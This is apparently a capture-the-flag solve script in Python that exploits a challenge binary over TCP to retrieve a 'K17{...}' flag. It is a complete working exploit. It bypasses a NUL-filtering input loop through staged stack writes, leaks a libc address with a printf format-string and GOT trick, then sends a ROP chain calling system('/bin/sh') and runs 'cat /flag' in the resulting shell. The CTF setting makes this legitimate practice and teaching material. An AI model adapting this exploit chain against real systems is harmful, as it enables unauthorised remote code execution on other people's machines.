import hashlib
import json
import re
import socket
import struct
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parent
PROMPT = b">> "
FLAG_RE = re.compile(rb"K17\{[^\r\n}]*\}")

BINARY_SHA256 = "5e0712c1b21a83adfc4a6f761455a141956be4f209e74981b76c445e29c4d0ec"
PRINTF_PLT = 0x4010D0
MAIN = 0x4012A2
PUTS_GOT = 0x404020

# debian:13.4-slim, image index digest from challenge/waf/Dockerfile.
PUTS_OFFSET = 0x805A0
SYSTEM_OFFSET = 0x53110
BIN_SH_OFFSET = 0x1A5EA4
POP_RDI_OFFSET = 0x2A145


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def load_endpoint(name: str) -> dict:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in data["endpoints"] if item["name"] == name)
    if endpoint["protocol"] != "tcp":
        raise ValueError("the main endpoint must use raw TCP")
    return endpoint


def verify_challenge() -> None:
    binary = ROOT / "challenge" / "waf" / "chal"
    digest = hashlib.sha256(binary.read_bytes()).hexdigest()
    if digest != BINARY_SHA256:
        raise ValueError(f"unexpected challenge binary SHA-256: {digest}")


def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise EOFError("the service closed the connection unexpectedly")
        data.extend(chunk)
        if len(data) > 1 << 20:
            raise ValueError("service response exceeded the safety limit")
    return bytes(data)


def send_sculpted(
    sock: socket.socket,
    payload: bytes,
    *,
    prompt_ready: bool = False,
    wait_after: bool = True,
) -> bytes:
    if len(payload) > 128:
        raise ValueError("stack image exceeds the initial 128-byte read")
    if not payload.startswith(b"exit"):
        raise ValueError("the final stack image must leave the input loop")

    if not prompt_ready:
        recv_until(sock, PROMPT)

    # Establish a NUL-free 128-byte image. Later short reads preserve the suffix.
    sock.sendall(b"A" * 128)
    recv_until(sock, PROMPT)

    zero_offsets = [index for index, value in enumerate(payload) if value == 0]
    if not zero_offsets:
        raise ValueError("stack image has no NUL bytes to trigger the final return")

    # Insert NUL bytes from high addresses to low addresses. Each read ends just
    # after its target NUL, so the filter cannot erase the suffix already built.
    for index in reversed(zero_offsets):
        stage = bytearray(payload[: index + 1])
        final_stage = index == zero_offsets[0]
        if not final_stage:
            stage[:4] = b"AAAA"
        for earlier in zero_offsets:
            if earlier >= index:
                break
            stage[earlier] = 0x41

        sock.sendall(stage)
        if not final_stage:
            recv_until(sock, PROMPT)

    if wait_after:
        return recv_until(sock, PROMPT)
    return b""


def exploit(endpoint: dict) -> bytes:
    with socket.create_connection((endpoint["host"], endpoint["port"]), timeout=10) as sock:
        sock.settimeout(10)

        leak_format = b"exitLEAK%6$sEND\n"
        leak_payload = leak_format.ljust(80, b"A") + b"B" * 8
        leak_payload += p64(PRINTF_PLT) + p64(MAIN) + p64(PUTS_GOT)
        response = send_sculpted(sock, leak_payload)

        marker = response.find(b"LEAK")
        if marker < 0:
            raise ValueError("leak marker was not returned")
        leak_start = marker + len(b"LEAK")
        leak_end = response.find(b"END", leak_start)
        if leak_end < 0:
            raise ValueError("leak terminator was not returned")
        leak = response[leak_start:leak_end]
        if len(leak) != 6:
            raise ValueError(f"expected a 6-byte puts leak, received {len(leak)} bytes")

        puts = int.from_bytes(leak, "little")
        libc_base = puts - PUTS_OFFSET
        if libc_base & 0xFFF:
            raise ValueError("the calculated libc base is not page-aligned")

        pop_rdi = libc_base + POP_RDI_OFFSET
        ret = pop_rdi + 1
        bin_sh = libc_base + BIN_SH_OFFSET
        system = libc_base + SYSTEM_OFFSET

        shell_payload = b"exit".ljust(80, b"A") + b"B" * 8
        shell_payload += p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
        send_sculpted(sock, shell_payload, prompt_ready=True, wait_after=False)

        sock.sendall(b"cat /flag\nexit\n")
        output = bytearray()
        while True:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            output.extend(chunk)
            if len(output) > 1 << 20:
                raise ValueError("shell response exceeded the safety limit")

    match = FLAG_RE.search(output)
    if match is None:
        raise ValueError("the shell response did not contain a valid flag")
    return match.group(0)


def main() -> int:
    try:
        verify_challenge()
        endpoint = load_endpoint("main")
        last_error = None
        for _ in range(3):
            try:
                flag = exploit(endpoint)
                sys.stdout.buffer.write(flag)
                return 0
            except (EOFError, OSError, TimeoutError, ValueError) as exc:
                last_error = exc
        raise RuntimeError(f"exploit failed after three attempts: {last_error}")
    except Exception as exc:
        print(f"solve failed: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
